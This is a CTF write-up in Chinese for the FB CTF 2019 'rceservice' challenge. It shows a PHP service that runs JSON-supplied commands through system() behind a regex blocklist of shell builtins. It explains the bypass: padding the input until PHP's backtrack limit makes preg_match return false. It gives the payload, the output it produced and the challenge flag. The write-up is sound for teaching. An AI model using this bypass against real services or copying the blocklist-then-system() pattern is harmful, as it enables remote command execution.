# rceservice

Solved: 31

<br>

```php
<?php

putenv('PATH=/home/rceservice/jail');

if (isset($_REQUEST['cmd'])) {
  $json = $_REQUEST['cmd'];

  if (!is_string($json)) {
    echo 'Hacking attempt detected<br/><br/>';
  } elseif (preg_match('/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\x00-\x1FA-Z0-9!#-\/;-@\[-`|~\x7F]+).*$/', $json)) {
    echo 'Hacking attempt detected<br/><br/>';
  } else {
    echo 'Attempting to run command:<br/>';
    $cmd = json_decode($json, true)['cmd'];
    if ($cmd !== NULL) {
      system($cmd);
    } else {
      echo 'Invalid input';
    }
    echo '<br/><br/>';
  }
}

?>
```

這題題目很短，用`preg_match`擋了一堆東西

但我們知道PHP有`pcre.backtrack_limit`限制，預設情況下，當回溯超過`1000000`次時，會回傳 `false`

(https://www.php.net/manual/en/pcre.configuration.php)

![](https://github.com/w181496/CTF/blob/master/fbctf2019/rceservice/)

上圖紅底字就代表發生回溯 (regex101 is your good friend)

Example:

```
php > var_dump(preg_match("/union.+select/is", "union select /*".str_repeat("s", 1000000)));
bool(false)
php > var_dump(preg_match("/union.+select/is", "union select /*".str_repeat("s", 1)));
int(1)
```

這在一般弱比較(Weak typing)情形下等同匹配成功

(`false == 0` => `true`)

但這邊其實不用管弱比較，因為他直接把`preg_match`回傳值丟進`if`做判斷

所以當回溯超過上限時，回傳`false`，自動就會略過這個`if`，進入到`else`裡面

e.g.

`'{"cmd":"ls -al /home/rceservice/","zz":"' + "a"*(1000000) + '"}'`

=>

```
drwxr-xr-x 1 root root       4096 May 26 21:20 ..
-r--r--r-- 1 root rceservice   43 May 23 03:58 flag
dr-xr-xr-x 1 root rceservice 4096 May 26 21:20 jail
```

Bypass successfully!


詳細 payload 見[exp.py](https://github.com/w181496/CTF/blob/master/fbctf2019/rceservice/exp.py)

flag: `fb{pr3g_M@tcH_m@K3s_m3_w@Nt_t0_cry!!1!!1!}`
